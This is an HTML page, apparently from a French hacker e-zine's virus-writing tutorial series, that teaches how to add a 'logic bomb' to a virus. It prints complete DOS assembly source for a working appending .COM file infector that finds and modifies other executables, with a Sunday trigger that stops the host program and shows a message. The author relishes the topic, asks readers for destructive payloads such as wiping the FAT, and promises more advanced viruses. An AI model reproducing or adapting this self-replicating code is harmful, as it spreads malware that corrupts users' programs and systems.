@@ -1,0 +1,285 @@
+<html>
+<head>
+<title>PeTa La BoMbA</title>
+</head>
+
+<body background="stars.jpg" bgcolor=black link=#006699 alink=#006699 vlink=#006699>
+<center>
+<img src="logo.jpg" >
+
+<br><br>
+<a href="virus3.html"><img alt="Infection dans les regles"  src="prev.gif" ></a>&nbsp;
+<a href="sommaire.html"><img alt="Sommaire"  src="toc.gif" ></a>&nbsp;
+<a href="iloveyou.html"><img alt="Le Virus ILOVEYOU"  src="next.gif"></a> 
+
+
+<br><br></center>
+
+<center>
+<table border> 
+<td width=650>
+<br>
+<FONT FACE="tahoma,verdana" size=2 color=green>
+<h1 align=center><font size=5 color=gray FACE="tahoma,Verdana">PeTa La BoMbA  </font></h1><br>
+<b>
+<font size=2 color=#006699>
+Histoire:<br>
+******<br>
+</font><br>
+Un virus qui se propage c'est marrant a programmer , mais alors cette partie de 
+la construction de virus c'est Le Meilleur, c'est jouissif.<br><br>
+What is a logical bomb ?<br>
+C'est simple, c'est le code qui se charge de foutre votre merde dans certaines
+conditions. Par exemple effacer la fat le jour de votre anniversaire, faire exploser
+le moniteur tous les 30 du mois etc.... (pour ca, j'attends vos sources, lol)<br>
+Moi je me chargerais juste que mon virus fasse la greve tous les dimanches, c'est a 
+dire qu'il n'infectera pas le dimanche et qu'il affichera le message : <br><br>
+
+<font size=2 color=#ff0000>
+"Je suis votre ordinateur, il est dimanche je refuse donc de travailler !"
+</font><br><br>
+Ce qui affichera cela, comme dans le premier virus par recouvrement:<br>
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+   message db 'Je suis votre ordinateur, il est dimanche 
+	       je refuse donc de travailler !','$'
+
+   lea dx,[bp+message]   ;message !
+   push ax
+   mov ax,0900h
+   int 21h
+   pop ax
+
+   mov ah,4ch      ;retour au dos
+   int 21h 
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+Ca c'est la partie simple, maintenant il faut se demerder pour savoir quand on est
+un dimanche. On sort donc encore notre doc sur les interruptions.
+et on trouve a l'int 21 code 2A Get Date.<br>
+Cette fonction retourne 0 en AL si on est dimanche, hehe.
+
+<font size=3 color=#ff0000>
+<pre>
+-----------------------------------------------------------------------------------
+
+CHECK_DAY:
+
+   mov ah,2Ah      ;Get Date
+   int 21h         ;
+   cmp al,0        ;Dimanche ou pas ?
+   jne pasgreve    ;si non, on fait pas la greve
+                   ;sinon on continue
+
+
+-----------------------------------------------------------------------------------
+</pre></font>
+Hehe, c'est tout con, voila donc le source complet (please copier-coller pas sans mon
+accord, j'ai mis du temps moi a le faire !)<br>
+
+
+<br><br><br><br><br><br>
+
+<font size=3 color=#ff0000>
+<pre>
+***********************************************************************************
+
+
+CODE    SEGMENT                                                          
+        ASSUME CS:CODE,DS:CODE                                                    
+
+ORG 100H  
+
+debut:
+
+   db 0e9h,0,0               ;on ecrie ca pour que le prog reconnaisse 
+                             ;qu'il est deja infecte
+                             ;car sinon il va s'auto-infecter
+
+
+virus:
+        call virus_start     ;call pour pouvoir recuperer l'adresse
+
+virus_start:
+
+   pop bp                    ;qu'on recupere       
+   sub bp,OFFSET virus_start ;et qu'on adapte a nos besoins
+
+
+   mov cx,3                  ;remet les 3 bits originaux
+   mov di,100h               ;depart du com
+   lea si,[bp+buffer]        ;endroit ou on a copie les 3 bits
+   rep movsb                 ;on le fait tant que cx!=0
+
+dta:
+
+   lea  dx,[bp+mydta]        ;adresse de mydta
+   mov  ah,1ah               ;Set DTA
+   int  21h                  ;
+
+CHECK_DAY:
+
+   mov ah,2Ah      ;Get Date
+   int 21h         ;
+   cmp al,0        ;Dimanche ou pas ?
+   jne pasgreve    ;si non, on fait pas la greve
+                   ;sinon on continue
+
+;greve
+
+   lea dx,[bp+message]   ;message !
+   push ax
+   mov ax,0900h
+   int 21h
+   pop ax
+   mov ah,4ch      ;retour au dos
+   int 21h 
+
+
+pasgreve:
+
+
+;findfirst
+
+   mov ah,4Eh                ;
+   lea dx,[bp+fichiercom]    ;findfirst
+   int 21h                   ;
+
+OUVERTURE:
+
+   jc fin                    ;si on trouve pas on quitte
+
+   mov ax,3D02h              ;ouverture-du-fichier(le 02 indique lecture-ecriture)
+   lea  dx,[bp+mydta+1eh]    ;nom dans DTA_PLACE+1eh
+   int 21h
+
+   mov bx,ax                 ;handle en bx
+
+
+CHECK_INFECTION:             ;ça c'est du code barbare !
+
+   mov ah,3fh                ;lecture du 1er bit
+   mov cx,1                  ;on en lit 1
+   lea dx,[bp+verification]  ;le bit dans verification
+   int 21h                   ;
+
+
+   cmp [bp+verification], 0e9h   ;compare le 1er bit a 0e9h
+   jz FERMETURE             ;si = on cherche un autre
+
+INFECTION:
+
+   mov ax, 4200h             ;pointeur du fichier au debut
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah,3fh                ;lecture des premiers bits
+   mov cx,3                  ;on en lit 3
+   lea dx,[bp+buffer]        ;les 3 bits dans buffer
+   int 21h                   ;
+
+
+   mov ax, 4202h             ;pointeur du fichier a la fin
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+;codage du jmp
+   sub ax,3
+   mov word ptr [bp+buffer2+1],ax     ;codage du jump
+
+
+   mov ah,40h                ;ecriture
+   mov cx, virus_end-virus   ;taille de notre virus
+   lea dx,[bp+virus]         ;pointe au debut du virus
+   int 21h
+
+
+;ecriture du jmp
+
+   mov ax, 4200h             ;pointeur du fichier au debut
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah, 40h               ;ecriture du jmp
+   mov cx, 3                 ;on écrit 3 bits
+   lea dx,[bp+buffer2]       ;pointe sur le jmp code
+   int 21h                   ;
+
+
+FERMETURE:
+
+   mov ah,3Eh                ;fermeture-du-fichier
+   int 21h
+
+   mov ah,4Fh                ;findnext
+   int 21h                   ;si y en a pas on se casse
+   jmp OUVERTURE             ;si y en a on revient
+
+
+fin:
+
+;execution-du-prog-victime
+
+fin_cherche:
+   mov  dx,80h               ;replacement de la dta
+   mov  ah,1ah
+   int  21h
+
+   mov di,100h               ;di pointe a 100h (depart des coms)
+   jmp di                    ;le virus passe la main au prog infecte
+
+variables:
+
+   buffer db 3 dup (?)       ;buffer des 3 bits
+   fichiercom db '*.COM',0   ;cible: les coms
+   buffer2 db 0e9h,?,?       ;buffer du jmp de depart
+   verification db ?         ;sert pour tester si le fichier est deja infecte
+   message db 'Je suis votre ordinateur, il est dimanche je refuse donc de 
+	       travailler !','$'
+   TiPiaX db 'FloW V1.0 By PoSeiDoN (Fr)'
+
+virus_end:
+   mydta db 42 dup (?)       ;on le met la car on ne veut pas copier le contenu
+                             ;de la DTA
+
+CODE ENDS
+END debut
+
+
+***********************************************************************************
+</pre></font>
+<br>
+C'est ici que s'acheve mes tuts sur les virii pour ce numero . La prochaine
+fois j'espere que je serais en mesure de vous apprendre comment faire un virus
+infecteur de *.exe et pourquoi pas polymorphe et resident (mais bien sur!).<br>
+Allez, revez bien !
+
+
+
+</b>
+<br><br>
+<DIV ALIGN="right"><font size=+1 color="#006699">Tipiax</font></DIV><br>
+
+
+</font></table></center><br>
+
+<center>
+<a href="virus3.html"><img alt="Infection dans les regles"  src="prev.gif" ></a>&nbsp;
+<a href="sommaire.html"><img alt="Sommaire"  src="toc.gif" ></a>&nbsp;
+<a href="iloveyou.html"><img alt="Le Virus ILOVEYOU"  src="next.gif"></a> 
+
+</center>
+
+</body>
+
+</html>
